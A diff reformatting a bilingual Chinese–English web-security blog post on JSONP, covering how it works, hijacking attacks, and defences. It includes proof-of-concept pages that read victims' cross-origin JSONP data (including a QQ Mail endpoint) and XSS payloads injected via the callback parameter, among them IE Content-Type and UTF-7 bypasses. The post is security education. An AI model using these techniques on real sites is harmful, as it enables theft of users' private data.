@@ -48,89 +48,48 @@ tags:
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">JSONP is really a simple trick to overcome the XMLHttpRequest same domain policy. (As you know one cannot send AJAX (XMLHttpRequest) request to a different domain.)，So - instead of using XMLHttpRequest we have to use script HTML tags, the ones you usually use to load js files, in order for js to get data from another domain. Sounds weird?，Thing is - turns out script tags can be used in a fashion similar to XMLHttpRequest! Check this out:
 </span>
-
-<div>
-<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
-<tbody valign="top">
-<tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">script = document.createElement('script');
-
+``` 
+script = document.createElement('script');
 script.type = 'text/javascript';
-
 script.src = 'http://www.someWebApiServer.com/some-data';</td>
-</tr>
-</tbody>
-</table>
-</div>
+``` 
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">You will end up with a script segment that looks like this after it loads the data:
 </span>
 
-<div>
-<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
-<tbody valign="top">
-<tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">&lt;script&gt;
-
+``` 
 {['some string 1', 'some data', 'whatever data']}
-
-&lt;/script&gt;</td>
-</tr>
-</tbody>
-</table>
-</div>
+``` 
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">However this is a bit inconvenient, because we have to fetch this array from script tag. So JSONPcreators decided that this will work better(and it is):
 </span>
 
-<div>
-<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
-<tbody valign="top">
-<tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">script = document.createElement('script');
-
+```
+script = document.createElement('script');
 script.type = 'text/javascript';
-
 script.src = 'http://www.someWebApiServer.com/some-data?callback=my_callback';</td>
-</tr>
-</tbody>
-</table>
-</div>
+``` 
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">Notice the my_callback function over there? So - when JSONP server receives your request and finds callback parameter - instead of returning plain js array it'll return this:
 </span>
 
-<div>
-<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
-<tbody valign="top">
-<tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">my_callback({['some string 1', 'some data', 'whatever data']});</td>
-</tr>
-</tbody>
-</table>
-</div>
+``` 
+my_callback({['some string 1', 'some data', 'whatever data']});</td>
+``` 
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">See where the profit is: now we get automatic callback (my_callback) that'll be triggered once we get the data.That's all there is to know about JSONP: it's a callback and script tags.，NOTE: these are simple examples of JSONP usage, these are not production ready scripts.
 </span>
 
-<div>
-<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
-<tbody valign="top">
-<tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">**Basic JavaScript example (simple Twitter feed using JSONP)
+``` 
+**Basic JavaScript example (simple Twitter feed using JSONP)
 **
+<html>
+<head>
+</head>;
+<body>;
+<div id = 'twitterFeed'></div>;
 
-&lt;html&gt;
-
-&lt;head&gt;
-
-&lt;/head&gt;
-
-&lt;body&gt;
-
-&lt;div id = 'twitterFeed'&gt;&lt;/div&gt;
-
-&lt;script&gt;
+<script>
 
 function myCallback(dataWeGotViaJsonp){
 
@@ -138,11 +97,11 @@ var text = '';
 
 var len = dataWeGotViaJsonp.length;
 
-for(var i=0;i&lt;len;i++){
+for(var i=0;i<len;i++){
 
 twitterEntry = dataWeGotViaJsonp[i];
 
-text += '&lt;p&gt;&lt;img src = "' + twitterEntry.user.profile_image_url_https +'"/&gt;' + twitterEntry['text'] + '&lt;/p&gt;'
+text += '<p><img src = "' + twitterEntry.user.profile_image_url_https +'"/>' + twitterEntry['text'] + '</p>'
 
 }
 
@@ -150,24 +109,24 @@ document.getElementById('twitterFeed').innerHTML = text;
 
 }
 
-&lt;/script&gt;
+</script>
 
-&lt;script type="text/javascript" src="http://twitter.com/status/user_timeline/padraicb.json?count=10&amp;callback=myCallback"&gt;&lt;/script&gt;
+<script type="text/javascript" src="http://twitter.com/status/user_timeline/padraicb.json?count=10&amp;callback=myCallback"></script>
 
-&lt;/body&gt;
+</body>
 
-&lt;/html&gt;
+</html>
 
 **Basic jQuery example (simple Twitter feed using JSONP)
 **
 
-&lt;html&gt;
+<html>
 
-&lt;head&gt;
+<head>
 
-&lt;script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"&gt;&lt;/script&gt;
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
 
-&lt;script&gt;
+<script>
 
 $(document).ready(function(){
 
@@ -183,11 +142,11 @@ var text = '';
 
 var len = dataWeGotViaJsonp.length;
 
-for(var i=0;i&lt;len;i++){
+for(var i=0;i<len;i++){
 
 twitterEntry = dataWeGotViaJsonp[i];
 
-text += '&lt;p&gt;&lt;img src = "' + twitterEntry.user.profile_image_url_https +'"/&gt;' + twitterEntry['text'] + '&lt;/p&gt;'
+text += '<p><img src = "' + twitterEntry.user.profile_image_url_https +'"/>' + twitterEntry['text'] + '</p>'
 
 }
 
@@ -199,26 +158,23 @@ $('#twitterFeed').html(text);
 
 })
 
-&lt;/script&gt;
+</script>
 
-&lt;/head&gt;
+</head>
 
-&lt;body&gt;
+<body>
 
-&lt;div id = 'twitterFeed'&gt;&lt;/div&gt;
+<div id = 'twitterFeed'></div>
 
-&lt;/body&gt;
+</body>
 
-&lt;/html&gt;</td>
-</tr>
-</tbody>
-</table>
-</div>
+</html></td>
+``` 
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">JSONP stands for JSON with Padding. (very poorly named technique as it really has nothing to do with what most people would think of as "padding".)
 </span>
 
-<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">总结：AJAX的底层原理是XMLHttpRequest，但是由于浏览器的同源策略，无论是get还是post请求，均不允许进行跨域操作，但是html对js和css则没有限制，这要是网站优化动静态元素分离的一个基础，JSONP就是基于此事实，去后台请求时返回可以执行的JS,例如&lt;script type="text/javascript" src="https://ajax.min.js"&gt;&lt;/script&gt; 返回mycallback({'id':'123'}，如果此刻在页面中有函数，Function mycallback(obj){alert(obj.id)} 则能正常的返回
+<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">总结：AJAX的底层原理是XMLHttpRequest，但是由于浏览器的同源策略，无论是get还是post请求，均不允许进行跨域操作，但是html对js和css则没有限制，这要是网站优化动静态元素分离的一个基础，JSONP就是基于此事实，去后台请求时返回可以执行的JS,例如<script type="text/javascript" src="https://ajax.min.js"></script> 返回mycallback({'id':'123'}，如果此刻在页面中有函数，Function mycallback(obj){alert(obj.id)} 则能正常的返回
 </span>
 
 ## 2.攻击举例
@@ -232,23 +188,23 @@ $('#twitterFeed').html(text);
 <table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
 <tbody valign="top">
 <tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">&lt;html&gt;
+<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><html>
 
 ...
 
-&lt;body&gt;
+<body>
 
-&lt;script type="text/javascript"&gt;
+<script type="text/javascript">
 
 Object.prototype.__defineSetter__('Id', function(obj){alert(obj);});
 
-&lt;/script&gt;
+</script>
 
-&lt;script src="http://example.com/Home/AdminBalances"&gt;&lt;/script&gt;
+<script src="http://example.com/Home/AdminBalances"></script>
 
-&lt;/body&gt;
+</body>
 
-&lt;/html&gt;</td>
+</html></td>
 </tr>
 </tbody>
 </table>
@@ -262,7 +218,7 @@ Object.prototype.__defineSetter__('Id', function(obj){alert(obj);});
 <table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
 <tbody valign="top">
 <tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">&lt;script type="text/javascript"&gt;
+<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><script type="text/javascript">
 
 var secrets;
 
@@ -274,15 +230,15 @@ secrets = this;
 
 };
 
-&lt;/script&gt;
+</script>
 
-&lt;script src="http://haacked.com/demos/secret-info.json"
+<script src="http://haacked.com/demos/secret-info.json"
 
-type="text/javascript"&gt;&lt;/script&gt;
+type="text/javascript"></script>
 
 &nbsp;
 
-&lt;script type="text/javascript"&gt;
+<script type="text/javascript">
 
 var yourData = '';
 
@@ -296,7 +252,7 @@ yourData += secrets[i] + ' ';
 
 alert('I stole your data: ' + yourData);
 
-&lt;/script&gt;</td>
+</script></td>
 </tr>
 </tbody>
 </table>
@@ -307,15 +263,15 @@ alert('I stole your data: ' + yourData);
 <table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
 <tbody valign="top">
 <tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">&lt;script&gt;
+<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><script>
 
 var Qmail={};
 
-&lt;/script&gt;
+</script>
 
-&lt;script src="http://mail.qq.com/cgi-bin/login?fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"&gt;&lt;/script&gt;
+<script src="http://mail.qq.com/cgi-bin/login?fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"></script>
 
-&lt;script&gt;
+<script>
 
 alert(Qmail.newMailsList.nextUrl);
 
@@ -323,7 +279,7 @@ alert(document.scripts[1].src=Qmail.newMailsList.nextUrl);
 
 alert(Qmail.newMailsList.summary);
 
-&lt;/script&gt;</td>
+</script></td>
 </tr>
 </tbody>
 </table>
@@ -331,13 +287,13 @@ alert(Qmail.newMailsList.summary);
 
 ## 4.漏洞防御:
 
-<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">因为此类漏洞为CSRF的变种，因此CSRF的防御均可以使用，详见[《【WEB安全】WEB安全基础知识系列-跨站请求伪造(CSRF)》](http://helloword.1kapp.com/archives/992)，其中重点介绍JSONP中的callback防御，在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞， 举例：[http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/)&lt;/script](http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/)&lt;/script)&gt;，对于 Content-Type 来说早期还有一部分人比较喜欢使用 application / javascript而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。对于这种类型的漏洞，防御主要是从两个点去部署的：
+<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">因为此类漏洞为CSRF的变种，因此CSRF的防御均可以使用，详见[《【WEB安全】WEB安全基础知识系列-跨站请求伪造(CSRF)》](http://helloword.1kapp.com/archives/992)，其中重点介绍JSONP中的callback防御，在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞， 举例：[http://127.0.0.1/getUsers.php?callback=<script>alert(/xss/)</script](http://127.0.0.1/getUsers.php?callback=<script>alert(/xss/)</script)>，对于 Content-Type 来说早期还有一部分人比较喜欢使用 application / javascript而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。对于这种类型的漏洞，防御主要是从两个点去部署的：
 </span>
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">**a、严格定义 Content-Type: application / json
 **</span>
 
-<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码（直接访问提示文件下载）。但是凡事都有个案，在 IE 的进化过程中就出现过通过一些技巧绕过 Content-Type 防御解析 html ，比如在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html （ http://127.0.0.1/getUsers.php/x.html?callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;  ） 具体参考：http://hi.baidu.com/hi_heige/item/f1ecde01c4af3ed61ef04646
+<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码（直接访问提示文件下载）。但是凡事都有个案，在 IE 的进化过程中就出现过通过一些技巧绕过 Content-Type 防御解析 html ，比如在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html （ http://127.0.0.1/getUsers.php/x.html?callback=<script>alert(/xss/)</script>  ） 具体参考：http://hi.baidu.com/hi_heige/item/f1ecde01c4af3ed61ef04646
 </span>
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">**b、过滤 callback 以及 JSON 数据输出
@@ -357,7 +313,7 @@ alert(Qmail.newMailsList.summary);
 </div>
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">其中 +/v8  为 utf7-BOM ，后面的为我们注入的 utf-7 编码后的 XSS 代码的：
-&lt;htm&gt;&lt;body&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/body&gt;&lt;/htm&gt;
+<htm><body><script>alert(1);</script></body></htm>
 </span>
 
 ## 4.总结与思考:<span style="font-family: 宋体;">
